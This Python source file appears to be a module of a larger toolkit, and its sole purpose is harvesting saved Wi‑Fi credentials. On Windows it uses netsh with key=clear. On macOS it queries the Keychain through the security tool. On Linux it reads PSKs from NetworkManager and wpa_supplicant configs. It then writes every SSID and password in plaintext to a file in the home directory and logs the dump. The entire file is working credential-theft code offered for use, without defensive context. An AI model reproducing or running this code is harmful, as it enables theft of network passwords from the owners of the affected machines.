# modules/wifi_cred_ext.py

import os
import platform
import subprocess
import re
import glob
import logging
from modules.logger import log_event

# ──────────────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────────────

WIFI_OUT_PATH = os.path.join(os.path.expanduser("~"), "wifi_credentials.txt")

# ──────────────────────────────────────────────────────────────────────────────

def extract_windows_wifi():
    """
    Uses 'netsh wlan' to enumerate profiles and reveal keys.
    Returns list of {'ssid':..., 'key':...}.
    """
    creds = []
    try:
        out = subprocess.check_output(["netsh", "wlan", "show", "profiles"],
                                      stderr=subprocess.DEVNULL, text=True)
        ssids = re.findall(r"All User Profile\s*:\s(.+)", out)
        for ssid in ssids:
            ssid = ssid.strip().strip('"')
            try:
                o2 = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    stderr=subprocess.DEVNULL, text=True
                )
                m = re.search(r"Key Content\s*:\s(.+)", o2)
                key = m.group(1).strip() if m else "<NONE>"
            except subprocess.CalledProcessError:
                key = "<ERROR>"
            creds.append({"ssid": ssid, "key": key})
    except Exception as e:
        logging.error(f"[wifi_cred_ext] extract_windows_wifi error: {e}")
        log_event({"type": "wifi_extraction_failed", "error": str(e)})
    return creds

def extract_macos_wifi():
    """
    Uses 'security' to fetch Wi‑Fi passwords from Keychain.
    Returns list of {'ssid':..., 'key':...}.
    """
    creds = []
    try:
        out = subprocess.check_output(
            ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
            stderr=subprocess.DEVNULL, text=True
        )
        lines = out.splitlines()[1:]
        ssids = []
        for line in lines:
            parts = line.split()
            if parts:
                ssids.append(parts[0])
        for ssid in ssids:
            try:
                # Use -g to get password (will prompt user if not unlocked)
                o2 = subprocess.check_output(
                    ["security", "find-generic-password", "-D", "AirPort network password", "-ga", ssid],
                    stderr=subprocess.STDOUT, text=True
                )
                m = re.search(r'password:\s*"(.+)"', o2)
                key = m.group(1) if m else "<NONE>"
            except subprocess.CalledProcessError as cpe:
                key = "<ERROR>"
            creds.append({"ssid": ssid, "key": key})
    except Exception as e:
        logging.error(f"[wifi_cred_ext] extract_macos_wifi error: {e}")
        log_event({"type": "wifi_extraction_failed", "error": str(e)})
    return creds

def extract_linux_wifi():
    """
    Check both NetworkManager and wpa_supplicant configurations for SSID & PSK.
    Requires root. Returns list of {'ssid':..., 'key':...}.
    """
    creds = []
    # 1) NetworkManager
    nm_dir = "/etc/NetworkManager/system-connections"
    if os.path.isdir(nm_dir):
        for fname in os.listdir(nm_dir):
            path = os.path.join(nm_dir, fname)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                m_ssid = re.search(r"^\s*ssid=(.+)$", content, re.MULTILINE)
                m_key = re.search(r"^\s*psk=(.+)$", content, re.MULTILINE)
                ssid = m_ssid.group(1).strip() if m_ssid else fname
                key = m_key.group(1).strip() if m_key else "<NONE>"
                creds.append({"ssid": ssid, "key": key})
            except Exception:
                continue

    # 2) wpa_supplicant (Debian/Ubuntu default)
    wpa_paths = glob.glob("/etc/wpa_supplicant/wpa_supplicant*.conf")
    for wpa_path in wpa_paths:
        try:
            with open(wpa_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            curr_ssid = None
            curr_psk = None
            for line in lines:
                line = line.strip()
                if line.startswith("ssid="):
                    curr_ssid = line.split("=", 1)[1].strip().strip('"')
                if line.startswith("psk="):
                    curr_psk = line.split("=", 1)[1].strip().strip('"')
                if curr_ssid and curr_psk:
                    creds.append({"ssid": curr_ssid, "key": curr_psk})
                    curr_ssid = None
                    curr_psk = None
        except Exception:
            continue

    return creds

def dump_wifi_credentials():
    """
    Detect current OS, extract Wi‑Fi credentials, write to WIFI_OUT_PATH, log event.
    """
    os_type = platform.system()
    result = []
    try:
        if os_type == "Windows":
            result = extract_windows_wifi()
        elif os_type == "Darwin":
            result = extract_macos_wifi()
        elif os_type == "Linux":
            result = extract_linux_wifi()
        else:
            return False

        if not result:
            return False

        os.makedirs(os.path.dirname(WIFI_OUT_PATH), exist_ok=True)
        with open(WIFI_OUT_PATH, "w", encoding="utf-8") as f:
            for entry in result:
                f.write(f"SSID: {entry['ssid']}  |  Key: {entry['key']}\n")
        log_event({"type": "wifi_dump", "file": WIFI_OUT_PATH})
        return True

    except Exception as e:
        logging.error(f"[wifi_cred_ext] dump_wifi_credentials error: {e}")
        log_event({"type": "wifi_dump_failed", "error": str(e)})
        return False


if __name__ == "__main__":
    ok = dump_wifi_credentials()
    if ok:
        print(f"[+] Wi‑Fi credentials dumped to {WIFI_OUT_PATH}")
    else:
        print("[!] Failed to dump Wi‑Fi credentials (need root/admin?).")
